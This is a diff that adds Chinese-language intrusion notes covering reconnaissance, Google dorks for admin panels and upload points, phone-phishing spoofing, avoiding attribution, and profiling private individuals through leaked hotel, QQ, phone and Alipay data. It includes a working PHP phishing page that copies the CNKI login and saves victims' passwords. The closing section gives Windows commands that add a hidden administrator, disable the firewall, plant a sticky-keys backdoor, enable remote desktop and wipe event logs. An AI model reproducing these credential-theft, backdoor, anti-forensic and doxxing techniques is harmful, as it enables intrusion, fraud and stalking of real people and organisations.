@@ -1,0 +1,188 @@
+
+绝对防御，社会工程学（把红队ip屏蔽掉）
+404设置返回200
+
+检查-删除-拉黑
+找到源码--搭建本地平台--
+
+什么是敏感数据？
+敏感数据包括但不限于：口令、密钥、证书、会话标识、License、隐私数据(如短消息的内容)、授权凭据、个人数据(如姓名、住址、电话等)等，在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。
+
+渗透测试全流程
+
+信息搜集：
+1.获取域名whois（邮箱，电话，使用社工库查看泄露密码，尝试登陆后台，邮箱--关键字--搜索引擎--社交账号，生成密码字典）
+2.查询服务器子站点，因为主站很难，查看是否有某个cms或者其他漏洞
+3.看ip，进行端口扫描，进行漏洞探测，mysql,web,ftp,ssh,3389.....，弱口令，管理员设置缺陷
+4.查看服务器操作系统版本，web中间件（iis apache nginx tomcat....)，是否存在已知漏洞（比如iis解析漏洞。。。。。）
+5.扫描网站目录结构（robots.txt，目录遍历，敏感文件泄露，php探针，上传）
+6.google hack进一步探测网站的信息（后台，敏感文件）
+(初始爆破---死亡爆破（下下策））
+
+漏洞扫描：
+开始检测漏洞，sql,文件上传,xss，xsrf，代码执行，命令执行，越权，目录读取，任意文件读取/下载，文件包含，编辑器，暴力破解....
+
+漏洞利用：
+以上方法拿到webshell
+
+权限提升：
+windows:
+windows低版本漏洞（iis6，pr，巴西烤肉,mysql udf提权，serv-u提权）
+linux:
+。。。。。。
+
+日志清理：
+msf日志清理工具
+
+信息收集
+网站
+查询出错了! - WebScan c段和旁站查询
+https://github.com/k8gege/K8CScan k8Scan工具，和cs联动
+http://seo.chinaz.com/
+http://whois.chinaz.com/
+ip数：理论值（不太可靠）
+IP地址：理论上的ip地址  
+同ip网站：通过同ip网站打到目的网站
+SEO：黑帽（通过非授权方式挂链接）/白帽（通过授权进行操作）
+（search engine optimization搜索引擎优化，通过搜索引擎规则让用户更容易搜索到自己公司内容）
+查询网站CMS
+
+漏洞挖掘
+一起来拿cnvd原创漏洞证书——信息泄露篇(结尾福利) - 先知社区 (aliyun.com)
+漏洞盒子，公益src
+公益SRC | 漏洞盒子 (vulbox.com)
+
+Google Hacking
+通过谷歌语法的作用远不止这些，平时也有积累的一些其他的语法，可以用来快速寻找想要的信息。尤其是用来查找一些网站的后台登录地址很有用
+
+查找后台地址：
+site:域名
+inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms
+查找文本内容：
+site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username
+查找可注入点：
+site:域名 inurl:aspx|jsp|php|asp
+查找上传漏洞：
+site:域名 inurl:file|load|editor|Files
+找eweb编辑器：
+site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit
+存在的数据库：
+site:域名 filetype:mdb|asp|#
+查看脚本类型：
+site:域名 filetype:asp/aspx/php/jsp
+迂回策略入侵：
+inurl:cms/data/templates/images/index/
+https://blog.csdn.net/m0_46363249/article/details/119988405  Google语法
+
+网络钓鱼：
+使用网站克隆工具
+实在不行，用手写
+
+<?php
+
+$username = $_POST['TextBoxUserName'];
+$password = $_POST['TextBoxPwd'];
+
+$txt = $username.'----'.$password;
+
+$file = fopen('./haha.txt','w');
+fwrite($file,$txt);
+fclose($file);
+
+header("location:https://login.cnki.net/login/?platform=kns&ForceReLogin=1&ReturnURL=https://www.cnki.net/");
+
+?>
+
+----------------
+
+电话钓鱼：
+https://www.spoofbox.com/zh
+skype
+(虚假来电，网络电话（冒充某些人），变声器）
+
+pstn（传统电话网络）
+
+伪装模拟：
+防止人家使用社工手段追踪自己
+安全指数最高的邮箱
+（国内许多邮箱邮件是明文传输，不加密）
+
+mail.protonmail.com
+10分钟邮箱
+（接一些无关紧要的注册）
+
+短信接码平台
+
+注册国外的产品:
+购买/注册google voice(gv)帐号(送你一个美国本土的电话)
+
+自己制作网站：
+vps(网页 vpn)
+[cloudflare只能帮你防御80和443端口的攻击和追踪]
+
+====================
+
+个人信息搜集：
+策略
+（网页快照，当时网站活着的时候发生的事）
+qq 微信 博客 微博 社区 贴吧 开房记录 外卖 快递 手机app
+社工库 （gogle)
+推断人轨
+（定点盗窃qq是不切实际的）
+
+
+qq-->手机号-->支付宝
+
+群关系，学校，同学关系
+
+3D面部建模（证件照，身份证，护照......）
+
+简历，公司关系查询
+
+----------
+
+渗透到对方的服务器之后：
+
+mmc--事件查看器
+（删除日志这件事本身就是一个日志，而且日志理论上无法单条删除）
+
+meterpreter---clearev
+
+----------
+
+vultr---使用kali的live模式--关闭ssh--直接使用网页连接(中国ip--美国vpn--vultr公司ip--内部网络操作kali-live)相对操作比较安全
+
+了解更多的vps，找到最适合当下环境的
+
+https://anonfiles.com/
+（给别人匿名传文件）
+
+========================
+添加用户
+net user zj 123 /add
+net localgroup administrators zj /add
+net localgroup users zj /del
+
+netsh advfirewall set allprofiles state off
+netsh advfirewall show allprofiles
+
+设置shift后门
+takeown /f c:\windows\system32\sethc.* /a /r /d y
+cacls c:\windows\system32\sethc.exe /T /E /G system:F
+cacls c:\windows\system32\sethc.exe /T /E /G administrator:F
+copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y
+
+远程服务(3389)启动
+扫描的时候：13389 
+C:\Windows\System32\wbem\wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+
+net start TermService
+
+win+r = mstsc
+如果是特殊端口 目标ip:13389
+
+=========================
+
+
